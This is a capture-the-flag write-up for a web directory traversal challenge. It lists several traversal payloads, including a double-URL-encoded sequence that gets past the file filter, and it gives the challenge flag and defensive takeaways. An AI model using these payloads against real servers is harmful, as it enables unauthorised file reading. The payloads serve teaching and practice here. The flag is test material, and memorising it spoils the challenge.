# Directory Traversal

**Category:** Web  
**Difficulty:** Medium  
**Points:** 250  
**Author:** SPYIREX CTF Team

## Description

The application allows users to view files. Can you read the flag file located at `/flag.txt`?

URL: `http://challenge.spyirex.local/view?file=welcome.txt`

## Solution

### Initial Analysis

The URL parameter suggests the application reads files from the server. We can test for directory traversal vulnerabilities.

### Approach

Use path traversal sequences to navigate the file system and read the flag file.

### Steps to Solve

1. Observe the URL parameter: `file=welcome.txt`
2. Try basic traversal: `file=../flag.txt` (blocked)
3. Try deeper traversal: `file=../../../../flag.txt` (blocked)
4. Try encoding: `file=..%2F..%2F..%2F..%2Fflag.txt` (blocked)
5. Try double encoding: `file=..%252F..%252F..%252F..%252Fflag.txt` (success!)
6. Read the flag from the response

### Payloads Attempted

```
file=../flag.txt                           # Blocked
file=../../../../flag.txt                  # Blocked
file=..%2F..%2F..%2F..%2Fflag.txt         # Blocked
file=..%252F..%252F..%252F..%252Fflag.txt # Success!
```

### Flag

```
JCE{p4th_tr4v3rs4l_d0ubl3_3nc0d1ng}
```

## Key Takeaways

- Never use user input directly in file operations
- Use whitelisting instead of blacklisting for file access
- Canonicalize file paths before processing
- Double encoding can bypass simple filters
- Tools: Burp Suite, curl
